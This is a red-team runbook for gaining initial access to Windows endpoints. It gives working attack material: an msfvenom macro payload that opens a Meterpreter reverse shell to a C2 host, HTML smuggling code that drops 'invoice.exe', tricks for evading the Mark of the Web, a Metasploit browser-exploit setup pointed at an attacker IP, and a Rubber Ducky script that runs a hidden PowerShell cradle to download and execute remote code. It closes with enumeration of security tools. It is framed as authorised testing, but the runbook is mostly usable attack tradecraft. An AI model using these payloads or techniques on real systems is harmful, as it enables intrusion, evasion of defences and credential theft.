# Runbook: Endpoint initial access

## Objective

Achieve code execution on a target endpoint through a delivery mechanism consistent with the engagement scope. Document what detection fired (or did not) and establish a foothold for subsequent credential harvesting.

## Phishing payload delivery

### Office macro delivery

Macro-enabled documents remain effective against targets where macro execution is not blocked by Group Policy. Confirm the target's Office version and macro policy before building the payload. Microsoft 365 now blocks macros in documents downloaded from the internet by default (Mark of the Web); the user must explicitly unblock the file or the document must arrive through a channel that does not add the MOTW zone identifier (e.g. a password-protected ZIP, which Windows does not inspect and therefore does not mark).

Build the payload in a format that prompts macro execution naturally:

```bash
# Generate a macro-embedded document with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<c2> LPORT=443 -f vba -o payload.vba
# Embed in a .doc file with a "Enable editing to view this document" social engineering lure
```

A Cobalt Strike or Sliver stageless payload embedded in a macro provides a more capable C2 channel. The macro should download and execute from memory rather than writing to disk.

### HTML smuggling

HTML smuggling reconstructs a binary payload client-side using JavaScript Blobs, bypassing network-level file inspection that examines HTTP responses:

```html
<script>
  const data = [/* base64 or byte array of payload */];
  const blob = new Blob([new Uint8Array(data)], {type: 'application/octet-stream'});
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = 'invoice.exe';
  a.click();
</script>
```

The payload is assembled in the browser's memory and written to the downloads folder. No network inspection device sees the binary traverse the network as a binary; they see only the HTML page.

### ISO and container file delivery

Wrapping payloads in ISO, VHD, or ZIP files bypasses MOTW propagation in older Windows versions. When the user opens an ISO file, Windows mounts it as a drive letter. Files extracted from or executed within the mounted ISO do not inherit the MOTW zone identifier on Windows 10 versions prior to the November 2022 patch.

## Browser exploitation

If the engagement scope includes client-side exploitation:

```bash
# Serve a browser exploit via BeEF or a custom Metasploit resource script
use exploit/multi/browser/...
set SRVHOST <attacker-IP>
set URIPATH /
run
```

Send the link to the target via phishing. Monitor for connections. Browser exploitation without a sandbox escape yields JavaScript execution context; with a sandbox escape, OS-level shellcode execution.

## USB delivery (if in scope)

```bash
# Prepare a Rubber Ducky payload to execute a PowerShell download cradle
# payload.txt (Ducky Script):
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://c2/s')"
ENTER
```

Test the timing on an equivalent target system before deployment.

## Confirming execution

Once a C2 callback is received, confirm execution context before taking any further action:

```bash
# Cobalt Strike / Sliver beacon — confirm context
whoami /all
systeminfo
tasklist /svc  # enumerate running security tools
```

Identify the EDR product, OS build, domain membership, and current user's privilege level. This informs the next phase.
